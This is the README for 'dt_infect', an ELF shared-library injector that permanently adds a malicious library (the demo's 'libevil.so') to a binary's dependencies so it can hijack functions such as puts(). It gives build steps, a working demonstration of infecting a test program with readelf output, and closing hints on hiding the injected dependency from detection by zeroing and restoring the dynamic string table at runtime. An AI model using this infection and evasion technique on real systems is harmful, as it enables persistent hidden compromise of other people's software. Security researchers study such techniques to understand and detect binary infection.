# dt_infect v1.0
```
Author: ElfMaster 2/15/19 - ryan@bitlackeys.org

ELF Shared library injector using DT_NEEDED precedence infection. Acts as a permanent LD_PRELOAD

NOTE: It does not work on PIE executables because it uses a reverse text padding infection to create room
for .dynstr. This could be replaced with a text padding infection, or a PT_NOTE to PT_LOAD conversion
infection in order to store the .dynstr; then it would be compatible with PIE executables.

# Build
git clone https://github.com/elfmaster/libelfmaster
cd libelfmaster; make; sudo make install
https://github.com/elfmaster/dt_infect/issues
# Example

-- Run test before it is infected

$ ./test
Don't infect me please

-- Then inject libevil.so into test and hijack puts()

$ make
$ ./inject libevil.so test
Updating .dynstr section
Modified d_entry.value of DT_STRTAB to: 3ff040 (index: 9)
Successfully injected 'libevil.so' into target: 'test'. Make sure to move 'libevil.so' into one of the shared object search paths, i.e. /lib/x86_64-gnu-linux/
$ readelf -d test | grep NEEDED
 0x0000000000000001 (NEEDED)             Shared library: [libevil.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
$ ./test
D0n'7 1nf3c7 m3 pl3453

# Further work with obfuscation

I will give a hint, since adding this extra layer of obfuscation will make this DT_NEEDED
much harder to detect... but there are several pieces of software out there that can obfuscate
the dynamic string table, which will prevent DT_NEEDED from showing up. The simplest formula
is to zero out .dynstr in the target binary, and inject some constructor code that replaces it
at runtime. @ulexec wrote a much better one that uses a custom runtime resolver.
```

